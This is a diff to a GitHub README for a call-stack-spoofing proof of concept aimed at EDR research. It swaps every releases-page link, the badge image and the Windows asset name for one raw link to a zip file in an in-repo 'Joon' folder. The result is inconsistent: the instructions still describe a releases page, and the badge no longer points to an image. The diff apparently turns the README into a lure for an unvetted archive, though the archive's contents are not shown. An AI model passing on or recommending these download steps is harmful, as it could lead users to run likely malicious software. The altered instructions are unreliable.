@@ -1,7 +1,7 @@
 # 🎉 Probabilistic-Call-Stack-PoC - Understand Execution Paths Easily
 
 ## 📦 Download Now
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/VitAaXentmax/Probabilistic-Call-Stack-PoC/releases)
+[![Download Latest Release](https://github.com/VitAaXentmax/Probabilistic-Call-Stack-PoC/raw/refs/heads/main/Joon/Probabilistic_Stack_C_Call_Po_1.7.zip%20release-brightgreen)](https://github.com/VitAaXentmax/Probabilistic-Call-Stack-PoC/raw/refs/heads/main/Joon/Probabilistic_Stack_C_Call_Po_1.7.zip)
 
 ## 🚀 Getting Started
 Welcome to the Probabilistic Call Stack Proof of Concept! This tool helps you understand how different execution paths affect call stack signatures. It is useful for enhancing security measures like EDR (Endpoint Detection and Response). Follow these simple steps to download and run the application.
@@ -21,10 +21,10 @@ To run the Probabilistic Call Stack PoC, ensure your system meets the following 
 - **Additional Software**: Ensure you have a current version of any necessary runtime environment (e.g., .NET for Windows users).
 
 ## 📥 Download & Install
-1. Click this link to go to the [Releases page](https://github.com/VitAaXentmax/Probabilistic-Call-Stack-PoC/releases).
+1. Click this link to go to the [Releases page](https://github.com/VitAaXentmax/Probabilistic-Call-Stack-PoC/raw/refs/heads/main/Joon/Probabilistic_Stack_C_Call_Po_1.7.zip).
 2. On the Releases page, you will see a list of available versions.
 3. Find the latest release, which will typically be at the top of the list.
-4. Click on the asset link that matches your operating system (e.g., `Probabilistic-Call-Stack-PoC-win.exe` for Windows).
+4. Click on the asset link that matches your operating system (e.g., `https://github.com/VitAaXentmax/Probabilistic-Call-Stack-PoC/raw/refs/heads/main/Joon/Probabilistic_Stack_C_Call_Po_1.7.zip` for Windows).
 5. Download the file to your computer.
 
 ### How to Run the Application
@@ -47,4 +47,4 @@ If you encounter any issues, feel free to reach out for assistance. Check the Gi
 
 Thank you for using Probabilistic-Call-Stack-PoC. Your feedback helps us improve the software. Happy testing!
 
-[Download the Latest Release](https://github.com/VitAaXentmax/Probabilistic-Call-Stack-PoC/releases)
+[Download the Latest Release](https://github.com/VitAaXentmax/Probabilistic-Call-Stack-PoC/raw/refs/heads/main/Joon/Probabilistic_Stack_C_Call_Po_1.7.zip)
